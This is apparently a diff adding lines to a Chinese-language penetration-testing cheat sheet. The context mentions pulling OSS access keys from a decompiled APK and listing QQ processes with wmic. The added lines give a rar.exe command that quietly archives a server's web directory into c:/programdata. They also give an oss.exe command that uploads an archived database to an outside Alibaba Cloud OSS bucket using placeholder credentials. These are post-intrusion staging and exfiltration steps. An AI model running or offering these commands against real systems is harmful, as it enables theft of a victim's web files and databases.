@@ -32,3 +32,15 @@ apk逆向得到class文件，全局搜索OSS_access
 ```
 wmic process where name="qq.exe" get processid,executablepath,name
 ```
+
+<h5>rar.exe压缩</h5>
+
+```
+rar.exe a -ag -k -r -s -ibck c:/programdata/wwww.rar  E:/web
+```
+
+<h5>oss传输文件</h5>
+
+```
+oss.exe cp c:\programdata\db.rar oss://xxx/xxx -e oss-cn-hongkong.aliyuncs.com -i xxx -k xxxx
+```
